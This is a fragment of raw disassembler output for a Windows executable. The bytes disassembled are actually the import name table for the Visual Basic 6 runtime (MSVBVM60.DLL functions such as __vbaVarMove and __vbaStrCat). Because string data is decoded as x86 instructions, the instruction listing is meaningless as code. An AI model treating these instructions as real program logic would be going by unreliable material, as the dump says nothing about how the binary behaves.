  407833:	00 1e                	add    %bl,(%esi)
  407835:	7b 00                	jnp    0x407837
  407837:	00 2c 7b             	add    %ch,(%ebx,%edi,2)
  40783a:	00 00                	add    %al,(%eax)
  40783c:	60                   	pusha
  40783d:	02 00                	add    (%eax),%al
  40783f:	80 3e 7b             	cmpb   $0x7b,(%esi)
  407842:	00 00                	add    %al,(%eax)
  407844:	52                   	push   %edx
  407845:	7b 00                	jnp    0x407847
  407847:	00 64 7b 00          	add    %ah,0x0(%ebx,%edi,2)
  40784b:	00 72 7b             	add    %dh,0x7b(%edx)
  40784e:	00 00                	add    %al,(%eax)
  407850:	80 7b 00 00          	cmpb   $0x0,0x0(%ebx)
  407854:	8a 7b 00             	mov    0x0(%ebx),%bh
  407857:	00 a0 7b 00 00 ac    	add    %ah,-0x53ffff85(%eax)
  40785d:	7b 00                	jnp    0x40785f
  40785f:	00 be 7b 00 00 d0    	add    %bh,-0x2fffff85(%esi)
  407865:	7b 00                	jnp    0x407867
  407867:	00 a9 02 00 80 e0    	add    %ch,-0x1f7ffffe(%ecx)
  40786d:	7b 00                	jnp    0x40786f
  40786f:	00 f4                	add    %dh,%ah
  407871:	7b 00                	jnp    0x407873
  407873:	00 06                	add    %al,(%esi)
  407875:	7c 00                	jl     0x407877
  407877:	00 ad 02 00 80 64    	add    %ch,0x64800002(%ebp)
  40787d:	00 00                	add    %al,(%eax)
  40787f:	80 14 7c 00          	adcb   $0x0,(%esp,%edi,2)
  407883:	00 26                	add    %ah,(%esi)
  407885:	7c 00                	jl     0x407887
  407887:	00 34 7c             	add    %dh,(%esp,%edi,2)
  40788a:	00 00                	add    %al,(%eax)
  40788c:	3e 7c 00             	jl,pt  0x40788f
  40788f:	00 4e 7c             	add    %cl,0x7c(%esi)
  407892:	00 00                	add    %al,(%eax)
  407894:	60                   	pusha
  407895:	7c 00                	jl     0x407897
  407897:	00 6a 7c             	add    %ch,0x7c(%edx)
  40789a:	00 00                	add    %al,(%eax)
  40789c:	74 7c                	je     0x40791a
  40789e:	00 00                	add    %al,(%eax)
  4078a0:	82 7c 00 00 8c       	cmpb   $0x8c,0x0(%eax,%eax,1)
  4078a5:	7c 00                	jl     0x4078a7
  4078a7:	00 9c 7c 00 00 00 00 	add    %bl,0x0(%esp,%edi,2)
  4078ae:	00 00                	add    %al,(%eax)
  4078b0:	4d                   	dec    %ebp
  4078b1:	53                   	push   %ebx
  4078b2:	56                   	push   %esi
  4078b3:	42                   	inc    %edx
  4078b4:	56                   	push   %esi
  4078b5:	4d                   	dec    %ebp
  4078b6:	36 30 2e             	xor    %ch,%ss:(%esi)
  4078b9:	44                   	inc    %esp
  4078ba:	4c                   	dec    %esp
  4078bb:	4c                   	dec    %esp
  4078bc:	00 00                	add    %al,(%eax)
  4078be:	00 00                	add    %al,(%eax)
  4078c0:	5f                   	pop    %edi
  4078c1:	43                   	inc    %ebx
  4078c2:	49                   	dec    %ecx
  4078c3:	63 6f 73             	arpl   %ebp,0x73(%edi)
  4078c6:	00 00                	add    %al,(%eax)
  4078c8:	00 00                	add    %al,(%eax)
  4078ca:	5f                   	pop    %edi
  4078cb:	61                   	popa
  4078cc:	64 6a 5f             	fs push $0x5f
  4078cf:	66 70 74             	data16 jo 0x407946
  4078d2:	61                   	popa
  4078d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d4:	00 00                	add    %al,(%eax)
  4078d6:	00 00                	add    %al,(%eax)
  4078d8:	5f                   	pop    %edi
  4078d9:	5f                   	pop    %edi
  4078da:	76 62                	jbe    0x40793e
  4078dc:	61                   	popa
  4078dd:	56                   	push   %esi
  4078de:	61                   	popa
  4078df:	72 4d                	jb     0x40792e
  4078e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078e2:	76 65                	jbe    0x407949
  4078e4:	00 00                	add    %al,(%eax)
  4078e6:	00 00                	add    %al,(%eax)
  4078e8:	5f                   	pop    %edi
  4078e9:	5f                   	pop    %edi
  4078ea:	76 62                	jbe    0x40794e
  4078ec:	61                   	popa
  4078ed:	41                   	inc    %ecx
  4078ee:	72 79                	jb     0x407969
  4078f0:	4d                   	dec    %ebp
  4078f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f2:	76 65                	jbe    0x407959
  4078f4:	00 00                	add    %al,(%eax)
  4078f6:	00 00                	add    %al,(%eax)
  4078f8:	5f                   	pop    %edi
  4078f9:	5f                   	pop    %edi
  4078fa:	76 62                	jbe    0x40795e
  4078fc:	61                   	popa
  4078fd:	46                   	inc    %esi
  4078fe:	72 65                	jb     0x407965
  407900:	65 56                	gs push %esi
  407902:	61                   	popa
  407903:	72 00                	jb     0x407905
  407905:	00 00                	add    %al,(%eax)
  407907:	00 5f 5f             	add    %bl,0x5f(%edi)
  40790a:	76 62                	jbe    0x40796e
  40790c:	61                   	popa
  40790d:	4c                   	dec    %esp
  40790e:	65 6e                	outsb  %gs:(%esi),(%dx)
  407910:	42                   	inc    %edx
  407911:	73 74                	jae    0x407987
  407913:	72 00                	jb     0x407915
  407915:	00 00                	add    %al,(%eax)
  407917:	00 5f 5f             	add    %bl,0x5f(%edi)
  40791a:	76 62                	jbe    0x40797e
  40791c:	61                   	popa
  40791d:	53                   	push   %ebx
  40791e:	74 72                	je     0x407992
  407920:	56                   	push   %esi
  407921:	61                   	popa
  407922:	72 4d                	jb     0x407971
  407924:	6f                   	outsl  %ds:(%esi),(%dx)
  407925:	76 65                	jbe    0x40798c
  407927:	00 00                	add    %al,(%eax)
  407929:	00 5f 5f             	add    %bl,0x5f(%edi)
  40792c:	76 62                	jbe    0x407990
  40792e:	61                   	popa
  40792f:	46                   	inc    %esi
  407930:	72 65                	jb     0x407997
  407932:	65 56                	gs push %esi
  407934:	61                   	popa
  407935:	72 4c                	jb     0x407983
  407937:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  40793e:	5f                   	pop    %edi
  40793f:	61                   	popa
  407940:	64 6a 5f             	fs push $0x5f
  407943:	66 64 69 76 5f 6d 36 	imul   $0x366d,%fs:0x5f(%esi),%si
  40794a:	34 00                	xor    $0x0,%al
  40794c:	00 00                	add    %al,(%eax)
  40794e:	5f                   	pop    %edi
  40794f:	5f                   	pop    %edi
  407950:	76 62                	jbe    0x4079b4
  407952:	61                   	popa
  407953:	46                   	inc    %esi
  407954:	72 65                	jb     0x4079bb
  407956:	65 4f                	gs dec %edi
  407958:	62 6a 4c             	bound  %ebp,0x4c(%edx)
  40795b:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  407962:	5f                   	pop    %edi
  407963:	61                   	popa
  407964:	64 6a 5f             	fs push $0x5f
  407967:	66 70 72             	data16 jo 0x4079dc
  40796a:	65 6d                	gs insl (%dx),%es:(%edi)
  40796c:	31 00                	xor    %eax,(%eax)
  40796e:	00 00                	add    %al,(%eax)
  407970:	5f                   	pop    %edi
  407971:	5f                   	pop    %edi
  407972:	76 62                	jbe    0x4079d6
  407974:	61                   	popa
  407975:	53                   	push   %ebx
  407976:	74 72                	je     0x4079ea
  407978:	43                   	inc    %ebx
  407979:	61                   	popa
  40797a:	74 00                	je     0x40797c
  40797c:	00 00                	add    %al,(%eax)
  40797e:	5f                   	pop    %edi
  40797f:	5f                   	pop    %edi
  407980:	76 62                	jbe    0x4079e4
  407982:	61                   	popa
  407983:	53                   	push   %ebx
  407984:	65 74 53             	gs je  0x4079da
  407987:	79 73                	jns    0x4079fc
  407989:	74 65                	je     0x4079f0
  40798b:	6d                   	insl   (%dx),%es:(%edi)
  40798c:	45                   	inc    %ebp
  40798d:	72 72                	jb     0x407a01
  40798f:	6f                   	outsl  %ds:(%esi),(%dx)
  407990:	72 00                	jb     0x407992
  407992:	00 00                	add    %al,(%eax)
  407994:	5f                   	pop    %edi
  407995:	5f                   	pop    %edi
  407996:	76 62                	jbe    0x4079fa
  407998:	61                   	popa
  407999:	48                   	dec    %eax
  40799a:	72 65                	jb     0x407a01
  40799c:	73 75                	jae    0x407a13
  40799e:	6c                   	insb   (%dx),%es:(%edi)
  40799f:	74 43                	je     0x4079e4
  4079a1:	68 65 63 6b 4f       	push   $0x4f6b6365
  4079a6:	62 6a 00             	bound  %ebp,0x0(%edx)
  4079a9:	00 00                	add    %al,(%eax)
  4079ab:	00 5f 61             	add    %bl,0x61(%edi)
  4079ae:	64 6a 5f             	fs push $0x5f
  4079b1:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  4079b8:	32 00                	xor    (%eax),%al
  4079ba:	00 00                	add    %al,(%eax)
  4079bc:	5f                   	pop    %edi
  4079bd:	5f                   	pop    %edi
  4079be:	76 62                	jbe    0x407a22
  4079c0:	61                   	popa
  4079c1:	41                   	inc    %ecx
  4079c2:	72 79                	jb     0x407a3d
  4079c4:	44                   	inc    %esp
  4079c5:	65 73 74             	gs jae 0x407a3c
  4079c8:	72 75                	jb     0x407a3f
  4079ca:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  4079ce:	00 00                	add    %al,(%eax)
  4079d0:	5f                   	pop    %edi
  4079d1:	5f                   	pop    %edi
  4079d2:	76 62                	jbe    0x407a36
  4079d4:	61                   	popa
  4079d5:	4f                   	dec    %edi
  4079d6:	62 6a 53             	bound  %ebp,0x53(%edx)
  4079d9:	65 74 00             	gs je  0x4079dc
  4079dc:	00 00                	add    %al,(%eax)
  4079de:	5f                   	pop    %edi
  4079df:	61                   	popa
  4079e0:	64 6a 5f             	fs push $0x5f
  4079e3:	66 64 69 76 5f 6d 31 	imul   $0x316d,%fs:0x5f(%esi),%si
  4079ea:	36 69 00 00 00 00 5f 	imul   $0x5f000000,%ss:(%eax),%eax
  4079f1:	61                   	popa
  4079f2:	64 6a 5f             	fs push $0x5f
  4079f5:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  4079fc:	31 36                	xor    %esi,(%esi)
  4079fe:	69 00 00 00 5f 43    	imul   $0x435f0000,(%eax),%eax
  407a04:	49                   	dec    %ecx
  407a05:	73 69                	jae    0x407a70
  407a07:	6e                   	outsb  %ds:(%esi),(%dx)
  407a08:	00 00                	add    %al,(%eax)
  407a0a:	00 00                	add    %al,(%eax)
  407a0c:	5f                   	pop    %edi
  407a0d:	5f                   	pop    %edi
  407a0e:	76 62                	jbe    0x407a72
  407a10:	61                   	popa
  407a11:	45                   	inc    %ebp
  407a12:	72 61                	jb     0x407a75
  407a14:	73 65                	jae    0x407a7b
  407a16:	00 00                	add    %al,(%eax)
  407a18:	00 00                	add    %al,(%eax)
  407a1a:	5f                   	pop    %edi
  407a1b:	5f                   	pop    %edi
  407a1c:	76 62                	jbe    0x407a80
  407a1e:	61                   	popa
  407a1f:	43                   	inc    %ebx
  407a20:	68 6b 73 74 6b       	push   $0x6b74736b
  407a25:	00 00                	add    %al,(%eax)
  407a27:	00 45 56             	add    %al,0x56(%ebp)
  407a2a:	45                   	inc    %ebp
  407a2b:	4e                   	dec    %esi
  407a2c:	54                   	push   %esp
  407a2d:	5f                   	pop    %edi
  407a2e:	53                   	push   %ebx
  407a2f:	49                   	dec    %ecx
  407a30:	4e                   	dec    %esi
  407a31:	4b                   	dec    %ebx
  407a32:	5f                   	pop    %edi
  407a33:	41                   	inc    %ecx
  407a34:	64 64 52             	fs fs push %edx
  407a37:	65 66 00 00          	data16 add %al,%gs:(%eax)
  407a3b:	00 5f 5f             	add    %bl,0x5f(%edi)
  407a3e:	76 62                	jbe    0x407aa2
  407a40:	61                   	popa
  407a41:	47                   	inc    %edi
  407a42:	65 6e                	outsb  %gs:(%esi),(%dx)
  407a44:	65 72 61             	gs jb  0x407aa8
  407a47:	74 65                	je     0x407aae
  407a49:	42                   	inc    %edx
  407a4a:	6f                   	outsl  %ds:(%esi),(%dx)
  407a4b:	75 6e                	jne    0x407abb
  407a4d:	64 73 45             	fs jae 0x407a95
  407a50:	72 72                	jb     0x407ac4
  407a52:	6f                   	outsl  %ds:(%esi),(%dx)
  407a53:	72 00                	jb     0x407a55
  407a55:	00 00                	add    %al,(%eax)
  407a57:	00 5f 5f             	add    %bl,0x5f(%edi)
  407a5a:	76 62                	jbe    0x407abe
  407a5c:	61                   	popa
  407a5d:	53                   	push   %ebx
  407a5e:	74 72                	je     0x407ad2
  407a60:	43                   	inc    %ebx
  407a61:	6d                   	insl   (%dx),%es:(%edi)
  407a62:	70 00                	jo     0x407a64
  407a64:	00 00                	add    %al,(%eax)
  407a66:	44                   	inc    %esp
  407a67:	6c                   	insb   (%dx),%es:(%edi)
  407a68:	6c                   	insb   (%dx),%es:(%edi)
  407a69:	46                   	inc    %esi
  407a6a:	75 6e                	jne    0x407ada
  407a6c:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  407a70:	6e                   	outsb  %ds:(%esi),(%dx)
  407a71:	43                   	inc    %ebx
  407a72:	61                   	popa
  407a73:	6c                   	insb   (%dx),%es:(%edi)
  407a74:	6c                   	insb   (%dx),%es:(%edi)
  407a75:	00 00                	add    %al,(%eax)
  407a77:	00 5f 5f             	add    %bl,0x5f(%edi)
  407a7a:	76 62                	jbe    0x407ade
  407a7c:	61                   	popa
  407a7d:	4c                   	dec    %esp
  407a7e:	62 6f 75             	bound  %ebp,0x75(%edi)
  407a81:	6e                   	outsb  %ds:(%esi),(%dx)
  407a82:	64 00 00             	add    %al,%fs:(%eax)
  407a85:	00 5f 61             	add    %bl,0x61(%edi)
  407a88:	64 6a 5f             	fs push $0x5f
  407a8b:	66 70 61             	data16 jo 0x407aef
  407a8e:	74 61                	je     0x407af1
  407a90:	6e                   	outsb  %ds:(%esi),(%dx)
  407a91:	00 00                	add    %al,(%eax)
  407a93:	00 5f 5f             	add    %bl,0x5f(%edi)
  407a96:	76 62                	jbe    0x407afa
  407a98:	61                   	popa
  407a99:	52                   	push   %edx
  407a9a:	65 64 69 6d 00 00 00 	gs imul $0x45000000,%fs:0x0(%ebp),%ebp
  407aa1:	00 45 
  407aa3:	56                   	push   %esi
  407aa4:	45                   	inc    %ebp
  407aa5:	4e                   	dec    %esi
  407aa6:	54                   	push   %esp
  407aa7:	5f                   	pop    %edi
  407aa8:	53                   	push   %ebx
  407aa9:	49                   	dec    %ecx
  407aaa:	4e                   	dec    %esi
  407aab:	4b                   	dec    %ebx
  407aac:	5f                   	pop    %edi
  407aad:	52                   	push   %edx
  407aae:	65 6c                	gs insb (%dx),%es:(%edi)
  407ab0:	65 61                	gs popa
  407ab2:	73 65                	jae    0x407b19
  407ab4:	00 00                	add    %al,(%eax)
  407ab6:	00 00                	add    %al,(%eax)
  407ab8:	5f                   	pop    %edi
  407ab9:	5f                   	pop    %edi
  407aba:	76 62                	jbe    0x407b1e
  407abc:	61                   	popa
  407abd:	55                   	push   %ebp
  407abe:	49                   	dec    %ecx
  407abf:	31 49 32             	xor    %ecx,0x32(%ecx)
  407ac2:	00 00                	add    %al,(%eax)
  407ac4:	00 00                	add    %al,(%eax)
  407ac6:	5f                   	pop    %edi
  407ac7:	43                   	inc    %ebx
  407ac8:	49                   	dec    %ecx
  407ac9:	73 71                	jae    0x407b3c
  407acb:	72 74                	jb     0x407b41
  407acd:	00 00                	add    %al,(%eax)
  407acf:	00 45 56             	add    %al,0x56(%ebp)
  407ad2:	45                   	inc    %ebp
  407ad3:	4e                   	dec    %esi
  407ad4:	54                   	push   %esp
  407ad5:	5f                   	pop    %edi
  407ad6:	53                   	push   %ebx
  407ad7:	49                   	dec    %ecx
  407ad8:	4e                   	dec    %esi
  407ad9:	4b                   	dec    %ebx
  407ada:	5f                   	pop    %edi
  407adb:	51                   	push   %ecx
  407adc:	75 65                	jne    0x407b43
  407ade:	72 79                	jb     0x407b59
  407ae0:	49                   	dec    %ecx
  407ae1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ae2:	74 65                	je     0x407b49
  407ae4:	72 66                	jb     0x407b4c
  407ae6:	61                   	popa
  407ae7:	63 65 00             	arpl   %esp,0x0(%ebp)
  407aea:	00 00                	add    %al,(%eax)
  407aec:	5f                   	pop    %edi
  407aed:	5f                   	pop    %edi
  407aee:	76 62                	jbe    0x407b52
  407af0:	61                   	popa
  407af1:	53                   	push   %ebx
  407af2:	74 72                	je     0x407b66
  407af4:	32 56 65             	xor    0x65(%esi),%dl
  407af7:	63 00                	arpl   %eax,(%eax)
  407af9:	00 00                	add    %al,(%eax)
  407afb:	00 5f 5f             	add    %bl,0x5f(%edi)
  407afe:	76 62                	jbe    0x407b62
  407b00:	61                   	popa
  407b01:	55                   	push   %ebp
  407b02:	49                   	dec    %ecx
  407b03:	31 49 34             	xor    %ecx,0x34(%ecx)
  407b06:	00 00                	add    %al,(%eax)
  407b08:	00 00                	add    %al,(%eax)
  407b0a:	5f                   	pop    %edi
  407b0b:	5f                   	pop    %edi
  407b0c:	76 62                	jbe    0x407b70
  407b0e:	61                   	popa
  407b0f:	45                   	inc    %ebp
  407b10:	78 63                	js     0x407b75
  407b12:	65 70 74             	gs jo  0x407b89
  407b15:	48                   	dec    %eax
  407b16:	61                   	popa
  407b17:	6e                   	outsb  %ds:(%esi),(%dx)
  407b18:	64 6c                	fs insb (%dx),%es:(%edi)
  407b1a:	65 72 00             	gs jb  0x407b1d
  407b1d:	00 00                	add    %al,(%eax)
  407b1f:	00 5f 61             	add    %bl,0x61(%edi)
  407b22:	64 6a 5f             	fs push $0x5f
  407b25:	66 70 72             	data16 jo 0x407b9a
  407b28:	65 6d                	gs insl (%dx),%es:(%edi)
  407b2a:	00 00                	add    %al,(%eax)
  407b2c:	00 00                	add    %al,(%eax)
  407b2e:	5f                   	pop    %edi
  407b2f:	61                   	popa
  407b30:	64 6a 5f             	fs push $0x5f
  407b33:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  407b3a:	36 34 00             	ss xor $0x0,%al
  407b3d:	00 00                	add    %al,(%eax)
  407b3f:	00 5f 5f             	add    %bl,0x5f(%edi)
  407b42:	76 62                	jbe    0x407ba6
  407b44:	61                   	popa
  407b45:	46                   	inc    %esi
  407b46:	50                   	push   %eax
  407b47:	45                   	inc    %ebp
  407b48:	78 63                	js     0x407bad
  407b4a:	65 70 74             	gs jo  0x407bc1
  407b4d:	69 6f 6e 00 00 00 00 	imul   $0x0,0x6e(%edi),%ebp
  407b54:	5f                   	pop    %edi
  407b55:	5f                   	pop    %edi
  407b56:	76 62                	jbe    0x407bba
  407b58:	61                   	popa
  407b59:	53                   	push   %ebx
  407b5a:	74 72                	je     0x407bce
  407b5c:	56                   	push   %esi
  407b5d:	61                   	popa
  407b5e:	72 56                	jb     0x407bb6
  407b60:	61                   	popa
  407b61:	6c                   	insb   (%dx),%es:(%edi)
  407b62:	00 00                	add    %al,(%eax)
  407b64:	00 00                	add    %al,(%eax)
  407b66:	5f                   	pop    %edi
  407b67:	5f                   	pop    %edi
  407b68:	76 62                	jbe    0x407bcc
  407b6a:	61                   	popa
  407b6b:	55                   	push   %ebp
  407b6c:	62 6f 75             	bound  %ebp,0x75(%edi)
  407b6f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b70:	64 00 00             	add    %al,%fs:(%eax)
  407b73:	00 5f 5f             	add    %bl,0x5f(%edi)
  407b76:	76 62                	jbe    0x407bda
  407b78:	61                   	popa
  407b79:	56                   	push   %esi
  407b7a:	61                   	popa
  407b7b:	72 43                	jb     0x407bc0
  407b7d:	61                   	popa
  407b7e:	74 00                	je     0x407b80
  407b80:	00 00                	add    %al,(%eax)
  407b82:	5f                   	pop    %edi
  407b83:	43                   	inc    %ebx
  407b84:	49                   	dec    %ecx
  407b85:	6c                   	insb   (%dx),%es:(%edi)
  407b86:	6f                   	outsl  %ds:(%esi),(%dx)
  407b87:	67 00 00             	add    %al,(%bx,%si)
  407b8a:	00 00                	add    %al,(%eax)
  407b8c:	5f                   	pop    %edi
  407b8d:	5f                   	pop    %edi
  407b8e:	76 62                	jbe    0x407bf2
  407b90:	61                   	popa
  407b91:	45                   	inc    %ebp
  407b92:	72 72                	jb     0x407c06
  407b94:	6f                   	outsl  %ds:(%esi),(%dx)
  407b95:	72 4f                	jb     0x407be6
  407b97:	76 65                	jbe    0x407bfe
  407b99:	72 66                	jb     0x407c01
  407b9b:	6c                   	insb   (%dx),%es:(%edi)
  407b9c:	6f                   	outsl  %ds:(%esi),(%dx)
  407b9d:	77 00                	ja     0x407b9f
  407b9f:	00 00                	add    %al,(%eax)
  407ba1:	00 5f 5f             	add    %bl,0x5f(%edi)
  407ba4:	76 62                	jbe    0x407c08
  407ba6:	61                   	popa
  407ba7:	4e                   	dec    %esi
  407ba8:	65 77 32             	gs ja  0x407bdd
  407bab:	00 00                	add    %al,(%eax)
  407bad:	00 5f 61             	add    %bl,0x61(%edi)
  407bb0:	64 6a 5f             	fs push $0x5f
  407bb3:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  407bba:	32 69 00             	xor    0x0(%ecx),%ch
  407bbd:	00 00                	add    %al,(%eax)
  407bbf:	00 5f 61             	add    %bl,0x61(%edi)
  407bc2:	64 6a 5f             	fs push $0x5f
  407bc5:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  407bcc:	33 32                	xor    (%edx),%esi
  407bce:	69 00 00 00 5f 5f    	imul   $0x5f5f0000,(%eax),%eax
  407bd4:	76 62                	jbe    0x407c38
  407bd6:	61                   	popa
  407bd7:	53                   	push   %ebx
  407bd8:	74 72                	je     0x407c4c
  407bda:	43                   	inc    %ebx
  407bdb:	6f                   	outsl  %ds:(%esi),(%dx)
  407bdc:	70 79                	jo     0x407c57
  407bde:	00 00                	add    %al,(%eax)
  407be0:	00 00                	add    %al,(%eax)
  407be2:	5f                   	pop    %edi
  407be3:	5f                   	pop    %edi
  407be4:	76 62                	jbe    0x407c48
  407be6:	61                   	popa
  407be7:	46                   	inc    %esi
  407be8:	72 65                	jb     0x407c4f
  407bea:	65 53                	gs push %ebx
  407bec:	74 72                	je     0x407c60
  407bee:	4c                   	dec    %esp
  407bef:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  407bf6:	5f                   	pop    %edi
  407bf7:	61                   	popa
  407bf8:	64 6a 5f             	fs push $0x5f
  407bfb:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  407c02:	33 32                	xor    (%edx),%esi
  407c04:	00 00                	add    %al,(%eax)
  407c06:	00 00                	add    %al,(%eax)
  407c08:	5f                   	pop    %edi
  407c09:	61                   	popa
  407c0a:	64 6a 5f             	fs push $0x5f
  407c0d:	66 64 69 76 5f 72 00 	imul   $0x72,%fs:0x5f(%esi),%si
  407c14:	00 00                	add    %al,(%eax)
  407c16:	5f                   	pop    %edi
  407c17:	5f                   	pop    %edi
  407c18:	76 62                	jbe    0x407c7c
  407c1a:	61                   	popa
  407c1b:	53                   	push   %ebx
  407c1c:	74 72                	je     0x407c90
  407c1e:	54                   	push   %esp
  407c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  407c20:	41                   	inc    %ecx
  407c21:	6e                   	outsb  %ds:(%esi),(%dx)
  407c22:	73 69                	jae    0x407c8d
  407c24:	00 00                	add    %al,(%eax)
  407c26:	00 00                	add    %al,(%eax)
  407c28:	5f                   	pop    %edi
  407c29:	5f                   	pop    %edi
  407c2a:	76 62                	jbe    0x407c8e
  407c2c:	61                   	popa
  407c2d:	56                   	push   %esi
  407c2e:	61                   	popa
  407c2f:	72 44                	jb     0x407c75
  407c31:	75 70                	jne    0x407ca3
  407c33:	00 00                	add    %al,(%eax)
  407c35:	00 5f 43             	add    %bl,0x43(%edi)
  407c38:	49                   	dec    %ecx
  407c39:	61                   	popa
  407c3a:	74 61                	je     0x407c9d
  407c3c:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3d:	00 00                	add    %al,(%eax)
  407c3f:	00 5f 5f             	add    %bl,0x5f(%edi)
  407c42:	76 62                	jbe    0x407ca6
  407c44:	61                   	popa
  407c45:	53                   	push   %ebx
  407c46:	74 72                	je     0x407cba
  407c48:	4d                   	dec    %ebp
  407c49:	6f                   	outsl  %ds:(%esi),(%dx)
  407c4a:	76 65                	jbe    0x407cb1
  407c4c:	00 00                	add    %al,(%eax)
  407c4e:	00 00                	add    %al,(%eax)
  407c50:	5f                   	pop    %edi
  407c51:	5f                   	pop    %edi
  407c52:	76 62                	jbe    0x407cb6
  407c54:	61                   	popa
  407c55:	53                   	push   %ebx
  407c56:	74 72                	je     0x407cca
  407c58:	56                   	push   %esi
  407c59:	61                   	popa
  407c5a:	72 43                	jb     0x407c9f
  407c5c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c5d:	70 79                	jo     0x407cd8
  407c5f:	00 00                	add    %al,(%eax)
  407c61:	00 5f 61             	add    %bl,0x61(%edi)
  407c64:	6c                   	insb   (%dx),%es:(%edi)
  407c65:	6c                   	insb   (%dx),%es:(%edi)
  407c66:	6d                   	insl   (%dx),%es:(%edi)
  407c67:	75 6c                	jne    0x407cd5
  407c69:	00 00                	add    %al,(%eax)
  407c6b:	00 5f 43             	add    %bl,0x43(%edi)
  407c6e:	49                   	dec    %ecx
  407c6f:	74 61                	je     0x407cd2
  407c71:	6e                   	outsb  %ds:(%esi),(%dx)
  407c72:	00 00                	add    %al,(%eax)
  407c74:	00 00                	add    %al,(%eax)
  407c76:	5f                   	pop    %edi
  407c77:	5f                   	pop    %edi
  407c78:	76 62                	jbe    0x407cdc
  407c7a:	61                   	popa
  407c7b:	55                   	push   %ebp
  407c7c:	49                   	dec    %ecx
  407c7d:	31 56 61             	xor    %edx,0x61(%esi)
  407c80:	72 00                	jb     0x407c82
  407c82:	00 00                	add    %al,(%eax)
  407c84:	5f                   	pop    %edi
  407c85:	43                   	inc    %ebx
  407c86:	49                   	dec    %ecx
  407c87:	65 78 70             	gs js  0x407cfa
  407c8a:	00 00                	add    %al,(%eax)
  407c8c:	00 00                	add    %al,(%eax)
  407c8e:	5f                   	pop    %edi
  407c8f:	5f                   	pop    %edi
  407c90:	76 62                	jbe    0x407cf4
  407c92:	61                   	popa
  407c93:	46                   	inc    %esi
  407c94:	72 65                	jb     0x407cfb
  407c96:	65 53                	gs push %ebx
  407c98:	74 72                	je     0x407d0c
  407c9a:	00 00                	add    %al,(%eax)
  407c9c:	00 00                	add    %al,(%eax)
  407c9e:	5f                   	pop    %edi
  407c9f:	5f                   	pop    %edi
  407ca0:	76 62                	jbe    0x407d04
  407ca2:	61                   	popa
  407ca3:	46                   	inc    %esi
  407ca4:	72 65                	jb     0x407d0b
  407ca6:	65 4f                	gs dec %edi
  407ca8:	62 6a 00             	bound  %ebp,0x0(%edx)
	...
